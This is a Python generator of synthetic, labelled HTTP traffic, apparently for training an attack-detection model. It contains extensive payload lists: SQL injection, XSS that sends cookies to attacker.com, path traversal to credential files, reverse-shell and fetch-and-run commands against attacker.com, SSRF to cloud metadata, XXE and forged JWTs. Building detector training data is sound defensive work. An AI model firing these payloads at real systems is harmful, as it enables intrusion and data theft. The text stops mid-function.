"""
Synthetic HTTP dataset generator — three-dataset fusion:

  1. CSIC 2010 style (e-commerce, included via parse_csic_2010)
  2. OWASP Juice Shop patterns (real CTF challenge attack vectors)
  3. HTTPParams fuzzing (parameter pollution, oversized, encoding attacks)

Supports real CSIC 2010 files if placed in data/:
  data/normalTrafficTraining.txt
  data/anomalousTrafficTest.txt

Attack coverage:
  - SQL Injection (classic, blind, UNION, error-based, stacked)
  - Cross-Site Scripting (reflected, stored, DOM, obfuscated)
  - Path Traversal (Unix, Windows, encoded, null-byte)
  - Command Injection (Unix, Windows, backtick, $(), &&)
  - NoSQL Injection (MongoDB operators, JSON injection)
  - JWT Abuse (alg:none, expired, tampered claims)
  - IDOR / Broken Access Control (object reference manipulation)
  - SSRF (internal network probing)
  - XXE (XML External Entity)
  - HTTP Parameter Pollution (duplicate params, encoding tricks)
  - CSRF (cross-origin state-changing requests)
"""

import re
import json
import random  # nosec B311 — used for synthetic training data generation, not cryptography
import string
import pandas as pd
from typing import List, Dict, Optional

random.seed(42)

# ── Normal Traffic Templates ──────────────────────────────────────────────────
NORMAL_PATHS = [
    '/tienda1/index.jsp', '/tienda1/publico/anadir.jsp', '/tienda1/publico/pagar.jsp',
    '/tienda1/publico/vaciar.jsp', '/tienda1/publico/entrar.jsp',
    '/tienda1/publico/registro.jsp', '/tienda1/publico/caracteristicas.jsp',
    '/api/products', '/api/users', '/api/orders', '/api/cart',
    '/login', '/register', '/profile', '/dashboard', '/search',
    '/checkout', '/account', '/settings', '/static/style.css', '/static/app.js',
    '/about', '/contact', '/faq', '/news', '/blog',
    # Juice Shop normal paths
    '/rest/user/login', '/rest/products/search', '/rest/basket',
    '/rest/user/whoami', '/api/challenges', '/api/feedbacks',
    '/api/complaints', '/api/recycles', '/api/deliverys',
    '/assets/public/images/products/',
]

# Modern SPA / REST API paths (chat apps, dashboards, auth flows)
MODERN_NORMAL_PATHS = [
    '/api/auth/login', '/api/auth/register', '/api/auth/logout', '/api/auth/me',
    '/api/auth/refresh', '/api/auth/verify', '/api/auth/forgot-password',
    '/api/users/profile', '/api/users/settings', '/api/users/avatar',
    '/api/messages', '/api/messages/inbox', '/api/messages/sent',
    '/api/chat/rooms', '/api/chat/messages', '/api/chat/members',
    '/api/notifications', '/api/notifications/read',
    '/api/search', '/api/feed', '/api/timeline',
    '/api/v1/health', '/api/v1/status', '/api/v2/users',
    '/health', '/healthz', '/status', '/metrics',
    '/login', '/register', '/forgot-password', '/reset-password',
    '/dashboard', '/inbox', '/profile', '/settings',
    '/static/main.js', '/static/app.css', '/static/bundle.js',
    '/favicon.ico', '/manifest.json', '/robots.txt',
]

# Random-looking hostnames typical of PaaS deployments (Railway, Render, Heroku, etc.)
# These produce higher url_entropy — model must learn they are normal
MODERN_DOMAINS = [
    'web-production-ce7b.up.railway.app',
    'my-app-abc123.up.railway.app',
    'secure-im-prod.onrender.com',
    'myapp-xyz789.herokuapp.com',
    'api-prod-a1b2c3.vercel.app',
    'backend.mycompany.io',
    'api.myapp.com',
    'app.example.com',
    '',  # relative URL (no domain) — most common training case
    '',  # weight relative URLs more
    '',
]

MODERN_NORMAL_BODIES = [
    '{{"username":"{user}","password":"{pwd}","device_id":"{did}","device_name":"{dn}"}}',
    '{{"email":"{email}","password":"{pwd}"}}',
    '{{"email":"{email}","password":"{pwd}","confirm_password":"{pwd}"}}',
    '{{"refresh_token":"{tok}"}}',
    '{{"username":"{user}","bio":"Hello I am {user}","avatar_url":""}}',
    '{{"room_id":"{did}","content":"Hello there","message_type":"text"}}',
    '{{"recipient_id":"{did}","message":"Hi how are you?"}}',
    '{{"page":1,"limit":20,"sort":"created_at"}}',
    '{{"query":"{user}","type":"user"}}',
    '{{"notification_ids":["{did}","{tok}"]}}',
]

NORMAL_PARAMS_GET = [
    'id=1', 'page=2', 'limit=20', 'sort=price', 'category=libros',
    'q=camiseta', 'color=azul', 'talla=M', 'precio=1', 'codigo=abc123',
    'user_id=5', 'lang=es', 'format=json', 'ref=home', 'token=valid123',
    'offset=0', 'count=10', 'filter=all', 'type=product', 'status=active',
]

NORMAL_BODIES_POST = [
    'nombre={name}&apellidos={last}&direccion=calle+mayor+123&correo={email}&pais=ES&tarjeta=4111111111111111&tipo=A',
    'username={user}&password={pwd}',
    'email={email}&password={pwd}&confirm={pwd}',
    'id={id}&cantidad=1&submit=Comprar',
    'campo=descripcion&texto=Un+producto+de+alta+calidad',
    '{{"email":"{email}","password":"{pwd}"}}',
    '{{"basketId":{id},"productId":1,"quantity":1}}',
]

NORMAL_UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
]

# ── Dataset 1: Classic SQLi (CSIC 2010 style + extended) ──────────────────────
SQLI_PAYLOADS = [
    # Classic
    "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "\" OR 1=1--",
    "' OR 1=1#", "admin'--", "admin' #", "' OR 'x'='x",
    # UNION-based
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables--",
    "1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Time-based blind
    "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; SELECT SLEEP(5)--",
    # Stacked queries
    "1'; DROP TABLE users;--",
    "'; INSERT INTO users VALUES('hacker','hacked','admin')--",
    "'; UPDATE users SET password='hacked' WHERE '1'='1",
    # Encoded
    "%27 OR %271%27=%271", "1%20OR%201=1",
    "%27%20UNION%20SELECT%20NULL--", "1'+OR+'1'='1",
    # Advanced
    "'; EXEC xp_cmdshell('whoami')--",
    "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "0x27 OR 0x313d31--",
]

# ── Dataset 2: OWASP Juice Shop SQLi ─────────────────────────────────────────
JUICE_SHOP_SQLI = [
    # Juice Shop login bypass (email field)
    "' OR 1=1--",
    "' OR 1=1;--",
    "admin@juice-sh.op'--",
    "' OR TRUE--",
    "1 AND 1=1",
    "1 OR 1=1",
    # Juice Shop product search injection
    "'; SELECT * FROM products WHERE name LIKE '%",
    "test%';SELECT sleep(5);--",
    "') OR ('1'='1",
    "1; SELECT * FROM users--",
    # Juice Shop score board bypass
    "'; UPDATE challenges SET solved=1;--",
    "1 UNION SELECT username,password,email,role FROM users--",
    "1' AND SLEEP(5)--",
    "' ORDER BY 1--",
    "' ORDER BY 100--",
    # NoSQL-flavored (Juice Shop uses SQLite)
    "'; SELECT name, sql FROM sqlite_master--",
    "1 UNION SELECT name,sql,NULL FROM sqlite_master",
    "'; ATTACH DATABASE '/var/www/html/shell.php' as shell;--",
]

# ── Dataset 3: HTTPParams Fuzzing ─────────────────────────────────────────────
HTTP_PARAMS_FUZZING = [
    # Parameter pollution
    "normal&id=1&id=2&id=DROP TABLE users--",
    "a=1%00b=2",  # null byte injection in params
    "a[]=1&a[]=2&a[]=<script>alert(1)</script>",
    # Oversized values
    "A" * 8192,
    "a=" + "B" * 4096,
    # Encoding attacks
    "%u0027 OR %u00271%u0027=%u00271",
    "&#x27; OR &#x27;1&#x27;=&#x27;1",
    "%252527%2520OR%2520%2525271%252527%253D%2525271",
    # Double encoding
    "%2527 OR %25271%2527=%25271",
    "%252F%252F%252F%252Fetc%252Fpasswd",
    # Unicode normalization
    "ʼ OR 1=1--",
    "＜script＞alert(1)＜/script＞",
    # Array injection
    "id[]=1&id[]=2 UNION SELECT NULL--",
    "user[admin]=1&user[role]=admin",
    # Content-type confusion
    '{"id": "1 OR 1=1"}',
    '{"$where": "1==1"}',
    # HPP - HTTP Parameter Pollution
    "color=red&color=blue&color=<script>alert(1)</script>",
    "token=abc&token=def&token=../../../../etc/passwd",
    # Mass assignment / privilege escalation via duplicate keys
    "role=user&role=admin", "isAdmin=false&isAdmin=true",
    "price=100&price=0", "discount=0&discount=100",
    "quantity=1&quantity=-1", "user_id=5&user_id=1",
    # Array-style duplicate params (PHP/Rails convention abuse)
    "filter[status]=active&filter[status]=deleted",
    "ids[]=1&ids[]=2&ids[]=3&ids[]=../../../etc/passwd",
    # Mixed-type confusion (string vs array vs object)
    "amount=10&amount[]=10&amount[$gt]=0",
    "search=test&search[0]=' OR 1=1--",
]

# ── XSS Payloads ─────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    # Event handlers
    "<img src=x onerror=alert(1)>", "<img src=x onerror=alert('XSS')>",
    "<body onload=alert(1)>", "<svg onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select onfocus=alert(1) autofocus>",
    # JavaScript URIs
    "javascript:alert(1)", "javascript:alert(document.cookie)",
    "<a href='javascript:alert(1)'>click</a>",
    # HTML injection
    "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    # Encoded
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # DOM-based
    "<script>document.write('<img src=x onerror=alert(document.cookie)>')</script>",
    "<script>window.location='http://attacker.com/?c='+document.cookie</script>",
    # Obfuscated
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<img src=`javascript:alert(1)`>",
    "<iframe src=javascript:alert(1)>",
    # Filter evasion
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<object data=javascript:alert(1)>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
]

# ── OWASP Juice Shop XSS ─────────────────────────────────────────────────────
JUICE_SHOP_XSS = [
    # Juice Shop iframe XSS (search endpoint)
    "<iframe src=\"javascript:alert(`xss`)\">",
    "<<script>alert('xss')//</script>",
    "<script>alert('vulnerable')</script>",
    # Stored XSS in feedback
    "<script>$.ajax({url:'/rest/products/search?q=test',success:function(d){alert(JSON.stringify(d))}})</script>",
    # DOM XSS via hash
    "#<script>alert('dom-xss')</script>",
    "javascript:alert(document.cookie)",
    # Juice Shop specific angular template injection
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    # Prototype pollution XSS
    "__proto__[innerHTML]=<img/src/onerror=alert(1)>",
    "constructor[prototype][innerHTML]=<img/src/onerror=alert(1)>",
]

# ── Path Traversal ────────────────────────────────────────────────────────────
PATH_TRAVERSAL_PAYLOADS = [
    # Unix
    "../../../../etc/passwd", "../../../etc/shadow",
    "../../../../../../etc/hosts", "../../../../proc/self/environ",
    "../../../../proc/version", "../../../var/log/auth.log",
    # Encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "....//....//....//etc/passwd",
    "..%5c..%5c..%5cetc%5cpasswd",
    # Null byte
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    # Windows
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "..%5c..%5c..%5cwindows%5csystem32%5ccmd.exe",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    # Absolute
    "/etc/passwd", "/etc/shadow", "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

# ── Command Injection ─────────────────────────────────────────────────────────
CMD_INJECTION_PAYLOADS = [
    "; ls -la", "; cat /etc/passwd", "| cat /etc/passwd",
    "| whoami", "`id`", "$(id)", "$(whoami)",
    "&& cat /etc/passwd", "; id", "; uname -a",
    "; ping -c 4 attacker.com",
    "| nc attacker.com 4444 -e /bin/sh",
    "; wget http://attacker.com/shell.sh -O /tmp/shell.sh; sh /tmp/shell.sh",
    "& dir", "& type c:\\windows\\win.ini",
    "| type c:\\boot.ini",
    "; curl http://attacker.com/shell | bash",
    "\n/bin/sh -i",
    "$(curl http://attacker.com/evil.sh|sh)",
    "`curl http://attacker.com/c.sh|bash`",
    "1; DROP TABLE users--",
]

# ── NoSQL Injection (MongoDB/CouchDB operators) ───────────────────────────────
NOSQL_INJECTION_PAYLOADS = [
    # MongoDB operator injection (query string)
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"$where": "sleep(5000)"}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    # Username/password bypass
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": "admin", "password": {"$gt": ""}}',
    '{"username": {"$in": ["admin","administrator","root"]}}',
    # JavaScript injection
    '{"$where": "this.username==this.password"}',
    '{"$where": "function(){return true;}"}',
    # URL-encoded NoSQL
    'username[$ne]=invalid&password[$ne]=invalid',
    'user[username][$ne]=invalid&user[password][$ne]=invalid',
    'username[$regex]=.*&password[$regex]=.*',
    # CouchDB SSRF via _all_docs
    '/_all_docs?include_docs=true',
    '/_design/ddoc/_view/view?limit=100',
    # Redis injection
    '\r\nSET hacked yes\r\n',
    '*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$3\r\nyes\r\n',
]

# ── JWT Abuse ─────────────────────────────────────────────────────────────────
JWT_ABUSE_PAYLOADS = [
    # alg:none attack (base64 encoded header + payload with no signature)
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9.',
    'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.',
    # Expired token (past exp claim)
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNjAwMDAwMDAwfQ.invalid_sig',
    # Tampered role claim (alg=HS256 but with known weak secret "secret")
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJ1c2VyQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0.tampered',
    # JWT with SQL injection in payload
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyBPUiAxPTEtLSIsInJvbGUiOiJ1c2VyIn0.sig',
    # Algorithm confusion RS256→HS256
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.rsa_public_key_used_as_hmac_secret',
]

# ── IDOR (Insecure Direct Object Reference) ───────────────────────────────────
IDOR_PATHS = [
    '/rest/user/1', '/rest/user/2', '/rest/user/0',
    '/api/users/1/orders', '/api/users/2/orders',
    '/rest/basket/1', '/rest/basket/-1', '/rest/basket/999999',
    '/api/orders/1', '/api/orders/../2',
    '/rest/memories/1', '/rest/memories/2',
    '/api/addresses/1', '/api/addresses/0',
    '/api/payments/1', '/api/payments/2',
    '/api/deliverys/1', '/api/deliverys/2',
    '/profile?id=1', '/profile?id=2', '/profile?id=../admin',
    '/api/users/1', '/api/users/2', '/api/users/3',
    '/api/invoices/1', '/api/invoices/2', '/api/invoices/100',
    '/api/documents/1', '/api/documents/55', '/api/files/1',
    '/api/messages/1', '/api/messages/2', '/api/conversations/1',
    '/api/accounts/1/transactions', '/api/accounts/2/transactions',
    '/api/tickets/1', '/api/tickets/2', '/api/reports/1',
    '/download?file_id=1', '/download?file_id=2',
    '/api/users/1/settings', '/api/users/2/settings',
]

# ── SSRF (Server-Side Request Forgery) ───────────────────────────────────────
SSRF_PAYLOADS = [
    # Internal network probing
    'http://localhost/admin',
    'http://127.0.0.1/admin',
    'http://0.0.0.0/admin',
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://192.168.1.1/admin',
    'http://10.0.0.1/admin',
    'http://172.16.0.1/admin',
    # Protocol smuggling
    'file:///etc/passwd',
    'file:///etc/shadow',
    'dict://localhost:6379/INFO',  # Redis
    'gopher://localhost:6379/_INFO',
    'ldap://localhost/dc=example,dc=com',
    # Obfuscated SSRF
    'http://①②⑦.0.0.1/',
    'http://0x7f000001/',  # 127.0.0.1 hex
    'http://2130706433/',  # 127.0.0.1 decimal
    'http://localhost%00.attacker.com/',
]

# ── XXE (XML External Entity) ─────────────────────────────────────────────────
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/environ">]><data>&file;</data>',
    # Billion laughs (DoS)
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    # Blind XXE via OOB
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
]

ATTACK_PARAMS = [
    'id', 'user', 'search', 'query', 'q', 'name', 'file', 'page',
    'path', 'cmd', 'exec', 'username', 'pass', 'input', 'data',
    'url', 'host', 'target', 'cat', 'action', 'redirect',
    'email', 'token', 'key', 'sort', 'order', 'filter', 'callback',
]


def _rand_ip() -> str:
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"  # nosec B311


def _rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))  # nosec B311


def _rand_email():
    return f"{_rand_str(6)}@{_rand_str(5)}.com"


def _rand_session():
    return ''.join(random.choices(string.hexdigits, k=32))  # nosec B311


def _proxy_chain_headers(host: str = 'app.example.com') -> dict:
    """Headers a reverse proxy / PaaS edge (Railway, Heroku, nginx) adds on
    top of the original browser headers. Real production traffic almost
    always carries these, so the synthetic distribution must include them
    too — otherwise num_headers alone becomes an out-of-distribution signal
    the model has never seen for either class."""
    ip = _rand_ip()
    pool = {
        'X-Forwarded-For': f'{ip}, {_rand_ip()}',
        'X-Forwarded-Host': host,
        'X-Forwarded-Proto': 'https',
        'X-Real-IP': ip,
        'X-Request-Start': str(random.randint(1_700_000_000_000, 1_800_000_000_000)),  # nosec B311
        'X-Railway-Edge': f'railway/{random.choice(["us-east4-eqdc4a", "us-west1-abc", "eu-west1-xyz"])}',  # nosec B311
        'X-Railway-Request-Id': _rand_str(22),
        'X-Hikari-Routed': '1',
    }
    keys = list(pool.keys())
    random.shuffle(keys)  # nosec B311
    n = random.randint(0, len(keys))  # nosec B311
    return {k: pool[k] for k in keys[:n]}


def _normal_headers(json_body=False):
    h = {
        'User-Agent': random.choice(NORMAL_UAS),  # nosec B311
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
    }
    if random.random() > 0.3:  # nosec B311
        h['Referer'] = f'http://localhost{random.choice(NORMAL_PATHS)}'  # nosec B311
    if random.random() > 0.3:  # nosec B311
        h['Cookie'] = f'JSESSIONID={_rand_session()}'
    h.update(_proxy_chain_headers())

    if json_body:
        h['Content-Type'] = 'application/json'
    return h


def _attack_headers():
    h = _normal_headers(json_body=False)
    # 20% chance to have a suspicious scanner user-agent
    if random.random() < 0.2:  # nosec B311
        ua_pool = [
            'sqlmap/1.7.8#stable', 'python-requests/2.28', 'Nikto/2.1.6',
            'curl/7.68.0', 'OWASP-Scanner/1.0', 'dirbuster/1.0',
            '', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
        ]
        h['User-Agent'] = random.choice(ua_pool)  # nosec B311
    return h


# ── Normal request generator ──────────────────────────────────────────────────
def _gen_normal() -> Dict:
    method = random.choices(['GET', 'POST', 'PUT', 'DELETE'], weights=[60, 30, 5, 5])[0]  # nosec B311
    path = random.choice(NORMAL_PATHS)  # nosec B311
    is_json = random.random() > 0.6  # nosec B311

    params, body = '', ''
    if method == 'GET' and random.random() > 0.4:  # nosec B311
        chosen = random.sample(NORMAL_PARAMS_GET, k=random.randint(1, 3))  # nosec B311
        params = '?' + '&'.join(chosen)
    elif method in ('POST', 'PUT'):
        tpl = random.choice(NORMAL_BODIES_POST)  # nosec B311
        body = tpl.format(
            name=_rand_str(), last=_rand_str(), email=_rand_email(),
            user=_rand_str(6), pwd=_rand_str(10), id=random.randint(1, 99),  # nosec B311
        )

    return {
        'method': method, 'url': path + params,
        'headers': _normal_headers(is_json), 'body': body,
        'ip': _rand_ip(), 'label': 0, 'attack_type': 'normal',
    }


# ── Modern SPA / REST API normal traffic ─────────────────────────────────────
def _gen_modern_normal() -> Dict:
    """Normal traffic for modern web apps: PaaS domains, JSON auth APIs, SPA paths.

    Specifically covers the false-positive pattern where high url_entropy from
    random-looking PaaS hostnames (e.g. web-production-ce7b.up.railway.app) causes
    the model to misclassify legitimate GET /login requests as attacks.
    """
    method = random.choices(['GET', 'POST', 'PUT', 'DELETE'], weights=[55, 35, 6, 4])[0]  # nosec B311
    path = random.choice(MODERN_NORMAL_PATHS)  # nosec B311
    domain = random.choice(MODERN_DOMAINS)  # nosec B311
    url = f'https://{domain}{path}' if domain else path

    body = ''
    if method in ('POST', 'PUT'):
        tpl = random.choice(MODERN_NORMAL_BODIES)  # nosec B311
        body = tpl.format(
            user=_rand_str(6), pwd=_rand_str(12), email=_rand_email(),
            did=_rand_str(8), dn=f'{_rand_str(4)}-device',
            tok=_rand_session(),
        )

    params = ''
    if method == 'GET' and random.random() > 0.6:  # nosec B311
        chosen = random.sample(NORMAL_PARAMS_GET, k=random.randint(1, 2))  # nosec B311
        params = '?' + '&'.join(chosen)

    headers = {
        'User-Agent': random.choice(NORMAL_UAS),  # nosec B311
        'Accept': random.choice([  # nosec B311
            'application/json',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            '*/*',
        ]),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'vi-VN,vi;q=0.9']),  # nosec B311
        'Accept-Encoding': 'gzip, deflate, br',
    }
    if body:
        headers['Content-Type'] = 'application/json'
    if random.random() > 0.5:  # nosec B311
        headers['Connection'] = 'keep-alive'
    if random.random() > 0.7:  # nosec B311
        headers['Upgrade-Insecure-Requests'] = '1'

    return {
        'method': method, 'url': url + params,
        'headers': headers, 'body': body,
        'ip': _rand_ip(), 'label': 0, 'attack_type': 'normal',
    }


# ── CSIC 2010 + classic SQLi ──────────────────────────────────────────────────
def _gen_sqli() -> Dict:
    payload = random.choice(SQLI_PAYLOADS)  # nosec B311
    param = random.choice(ATTACK_PARAMS)  # nosec B311
    method = random.choices(['GET', 'POST'], weights=[60, 40])[0]  # nosec B311
    path = random.choice(NORMAL_PATHS)  # nosec B311

    url, body = path, ''
    if method == 'GET':
        url = f"{path}?{param}={payload}&otro=valor"
    else:
        body = f"{param}={payload}&action=submit"

    return {
        'method': method, 'url': url,
        'headers': _attack_headers(),
        'body': body, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'sqli',
    }


# ── OWASP Juice Shop attack generator ────────────────────────────────────────
def _gen_juice_shop_sqli() -> Dict:
    payload = random.choice(JUICE_SHOP_SQLI)  # nosec B311
    method = random.choices(['GET', 'POST'], weights=[50, 50])[0]  # nosec B311
    path = random.choice([  # nosec B311
        '/rest/products/search', '/rest/user/login',
        '/api/challenges', '/api/users', '/rest/basket',
    ])

    url, body = path, ''
    if method == 'GET':
        url = f"{path}?q={payload}"
    else:
        body = json.dumps({"email": payload, "password": "anything"})  # nosec B105 — simulated attack payload, not a real credential

    return {
        'method': method, 'url': url,
        'headers': {**_attack_headers(), 'Content-Type': 'application/json'},
        'body': body, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'sqli',
    }


def _gen_juice_shop_xss() -> Dict:
    payload = random.choice(JUICE_SHOP_XSS + XSS_PAYLOADS)  # nosec B311
    method = random.choices(['GET', 'POST'], weights=[60, 40])[0]  # nosec B311
    path = random.choice([  # nosec B311
        '/rest/products/search', '/api/feedbacks',
        '/api/complaints', '/search', '/comment',
    ])

    url, body = path, ''
    param = random.choice(['q', 'search', 'comment', 'message', 'feedback'])  # nosec B311
    if method == 'GET':
        url = f"{path}?{param}={payload}"
    else:
        body = json.dumps({param: payload, "rating": 1})

    return {
        'method': method, 'url': url,
        'headers': {**_attack_headers(), 'Content-Type': 'application/json'},
        'body': body, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'xss',
    }


def _gen_idor() -> Dict:
    path = random.choice(IDOR_PATHS)  # nosec B311
    method = random.choices(['GET', 'PUT', 'DELETE'], weights=[70, 20, 10])[0]  # nosec B311
    return {
        'method': method, 'url': path,
        'headers': _attack_headers(),
        'body': '', 'ip': _rand_ip(), 'label': 1, 'attack_type': 'idor',
    }


# ── HTTPParams dataset ────────────────────────────────────────────────────────
def _gen_http_params() -> Dict:
    payload = random.choice(HTTP_PARAMS_FUZZING)  # nosec B311
    param = random.choice(ATTACK_PARAMS)  # nosec B311
    path = random.choice(NORMAL_PATHS)  # nosec B311
    method = random.choices(['GET', 'POST'], weights=[50, 50])[0]  # nosec B311

    url, body = path, ''
    if method == 'GET':
        url = f"{path}?{param}={payload}&{param}={_rand_str()}"
    else:
        body = f"{param}={payload}&{param}={_rand_str()}"

    return {
        'method': method, 'url': url,
        'headers': _attack_headers(),
        'body': body, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'http_params',
    }


# ── NoSQL Injection generator ─────────────────────────────────────────────────
def _gen_nosql() -> Dict:
    payload = random.choice(NOSQL_INJECTION_PAYLOADS)  # nosec B311
    method = random.choices(['GET', 'POST'], weights=[40, 60])[0]  # nosec B311
    path = random.choice([  # nosec B311
        '/api/users/login', '/rest/user/login', '/login',
        '/api/auth', '/graphql', '/api/query',
    ])

    url, body = path, ''
    if method == 'GET':
        url = f"{path}?query={payload}"
    else:
        body = payload if payload.startswith('{') else json.dumps({"username": payload})

    return {
        'method': method, 'url': url,
        'headers': {**_attack_headers(), 'Content-Type': 'application/json'},
        'body': body, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'nosql_injection',
    }


# ── JWT Abuse generator ───────────────────────────────────────────────────────
def _gen_jwt_abuse() -> Dict:
    jwt_token = random.choice(JWT_ABUSE_PAYLOADS)  # nosec B311
    path = random.choice([  # nosec B311
        '/rest/user/whoami', '/api/users/me', '/admin',
        '/api/challenges', '/rest/basket', '/api/orders',
    ])
    return {
        'method': 'GET', 'url': path,
        'headers': {
            **_attack_headers(),
            'Authorization': f'Bearer {jwt_token}',
        },
        'body': '', 'ip': _rand_ip(), 'label': 1, 'attack_type': 'jwt_abuse',
    }


# ── SSRF generator ────────────────────────────────────────────────────────────
def _gen_ssrf() -> Dict:
    payload = random.choice(SSRF_PAYLOADS)  # nosec B311
    param = random.choice(['url', 'redirect', 'callback', 'next', 'target', 'src', 'host', 'proxy'])  # nosec B311
    path = random.choice(['/api/fetch', '/proxy', '/redirect', '/api/webhook', '/download'])  # nosec B311
    method = random.choices(['GET', 'POST'], weights=[60, 40])[0]  # nosec B311

    url, body = path, ''
    if method == 'GET':
        url = f"{path}?{param}={payload}"
    else:
        body = json.dumps({param: payload})

    return {
        'method': method, 'url': url,
        'headers': {**_attack_headers(), 'Content-Type': 'application/json'},
        'body': body, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'ssrf',
    }


# ── XXE generator ─────────────────────────────────────────────────────────────
def _gen_xxe() -> Dict:
    payload = random.choice(XXE_PAYLOADS)  # nosec B311
    path = random.choice(['/api/upload', '/api/parse', '/api/xml', '/import', '/convert'])  # nosec B311
    return {
        'method': 'POST', 'url': path,
        'headers': {**_attack_headers(), 'Content-Type': 'application/xml'},
        'body': payload, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'xxe',
    }


# ── XSS generator ────────────────────────────────────────────────────────────
def _gen_xss() -> Dict:
